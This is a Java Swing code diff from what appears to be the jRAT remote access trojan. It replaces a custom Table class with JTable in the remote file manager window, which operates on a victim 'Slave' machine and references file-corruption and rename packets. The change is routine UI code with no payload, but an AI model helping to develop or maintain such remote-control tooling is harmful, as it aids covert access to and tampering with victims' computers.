@@ -32,6 +32,7 @@ import javax.swing.JPopupMenu;
 import javax.swing.JProgressBar;
 import javax.swing.JScrollPane;
 import javax.swing.JSplitPane;
+import javax.swing.JTable;
 import javax.swing.JTextField;
 import javax.swing.JToolBar;
 import javax.swing.LayoutStyle.ComponentPlacement;
@@ -59,7 +60,6 @@ import pro.jrat.packets.outgoing.Packet47RenameFile;
 import pro.jrat.packets.outgoing.Packet64FileHash;
 import pro.jrat.packets.outgoing.Packet70CorruptFile;
 import pro.jrat.settings.FileBookmarks;
-import pro.jrat.ui.components.Table;
 import pro.jrat.ui.renderers.table.FileViewTableRenderer;
 import pro.jrat.utils.IconUtils;
 import pro.jrat.utils.Utils;
@@ -73,7 +73,7 @@ public class FrameRemoteFiles extends BaseFrame {
 	public Slave slave;
 	public static HashMap<Slave, FrameRemoteFiles> instances = new HashMap<Slave, FrameRemoteFiles>();
 	public JTextField txtDir;
-	public Table table;
+	public JTable table;
 	public FileViewTableRenderer renderer;
 	public FileViewTableRenderer rendererme;
 	public DefaultTableModel model;
@@ -82,7 +82,7 @@ public class FrameRemoteFiles extends BaseFrame {
 	public HashMap<String, Icon> icons = new HashMap<String, Icon>();
 
 	private JPopupMenu popupMenu;
-	private Table tableme;
+	private JTable tableme;
 	private JButton btnGome;
 	private JButton btnBackme;
 	private JButton btnRefreshme;
@@ -422,7 +422,7 @@ public class FrameRemoteFiles extends BaseFrame {
 
 		JScrollPane scrollPane = new JScrollPane();
 		splitPane.setRightComponent(scrollPane);
-		table = new Table(model);
+		table = new JTable(model);
 		table.setDefaultRenderer(Object.class, renderer = new FileViewTableRenderer(slave));
 		table.addMouseListener(new MouseAdapter() {
 			@Override
@@ -768,7 +768,7 @@ public class FrameRemoteFiles extends BaseFrame {
 
 		JScrollPane scrollPaneme = new JScrollPane();
 		splitPane.setLeftComponent(scrollPaneme);
-		tableme = new Table(modelme);
+		tableme = new JTable(modelme);
 		tableme.setDefaultRenderer(Object.class, rendererme = new FileViewTableRenderer(slave));
 		tableme.getTableHeader().setReorderingAllowed(false);
 		tableme.addMouseListener(new MouseAdapter() {
